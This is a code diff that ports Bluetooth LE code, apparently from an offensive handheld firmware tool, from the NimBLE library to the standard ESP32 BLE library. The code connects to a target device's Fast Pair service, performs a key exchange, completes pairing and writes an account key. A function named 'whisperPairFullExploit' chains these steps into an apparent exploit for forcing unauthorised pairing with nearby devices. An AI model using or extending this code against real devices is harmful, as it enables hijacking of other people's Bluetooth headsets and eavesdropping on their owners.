@@ -2,23 +2,26 @@
 #include "fastpair_crypto.h"
 #include <globals.h>
 #include "core/display.h"
+#include <BLEDevice.h>
+#include <BLEClient.h>
+#include <BLEUtils.h>
 
 FastPairCrypto crypto;
 
-bool fastpair_ecdh_key_exchange(NimBLEAddress target, uint8_t* shared_secret) {
+bool fastpair_ecdh_key_exchange(BLEAddress target, uint8_t* shared_secret) {
     displayMessage("Connecting...", "", "", "", TFT_WHITE);
-    NimBLEClient* pClient = NimBLEDevice::createClient();
+    BLEClient* pClient = BLEDevice::createClient();
     if(!pClient->connect(target)) {
         displayMessage("Connect failed", "", "", "", TFT_RED);
         return false;
     }
-    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
+    BLERemoteService* pService = pClient->getService(BLEUUID((uint16_t)0xFE2C));
     if(!pService) {
         displayMessage("No FastPair service", "", "", "", TFT_RED);
         pClient->disconnect();
         return false;
     }
-    NimBLERemoteCharacteristic* pKeyChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
+    BLERemoteCharacteristic* pKeyChar = pService->getCharacteristic(BLEUUID((uint16_t)0x1234));
     if(!pKeyChar) {
         displayMessage("No KBP char", "", "", "", TFT_RED);
         pClient->disconnect();
@@ -61,15 +64,15 @@ bool fastpair_ecdh_key_exchange(NimBLEAddress target, uint8_t* shared_secret) {
     return true;
 }
 
-bool fastpair_complete_pairing(NimBLEAddress target, const uint8_t* shared_secret) {
-    NimBLEClient* pClient = NimBLEDevice::createClient();
+bool fastpair_complete_pairing(BLEAddress target, const uint8_t* shared_secret) {
+    BLEClient* pClient = BLEDevice::createClient();
     if(!pClient->connect(target)) return false;
-    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
+    BLERemoteService* pService = pClient->getService(BLEUUID((uint16_t)0xFE2C));
     if(!pService) {
         pClient->disconnect();
         return false;
     }
-    NimBLERemoteCharacteristic* pKeyChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
+    BLERemoteCharacteristic* pKeyChar = pService->getCharacteristic(BLEUUID((uint16_t)0x1234));
     if(!pKeyChar) {
         pClient->disconnect();
         return false;
@@ -86,7 +89,7 @@ bool fastpair_complete_pairing(NimBLEAddress target, const uint8_t* shared_secre
         return false;
     }
     delay(100);
-    NimBLERemoteCharacteristic* pAccountChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1236));
+    BLERemoteCharacteristic* pAccountChar = pService->getCharacteristic(BLEUUID((uint16_t)0x1236));
     if(pAccountChar) {
         crypto.generateAccountKey();
         pAccountChar->writeValue(crypto.getAccountKey(), 16, true);
@@ -95,7 +98,7 @@ bool fastpair_complete_pairing(NimBLEAddress target, const uint8_t* shared_secre
     return true;
 }
 
-bool whisperPairFullExploit(NimBLEAddress target) {
+bool whisperPairFullExploit(BLEAddress target) {
     uint8_t shared_secret[32];
     if(!fastpair_ecdh_key_exchange(target, shared_secret)) return false;
     if(!fastpair_complete_pairing(target, shared_secret)) return false;
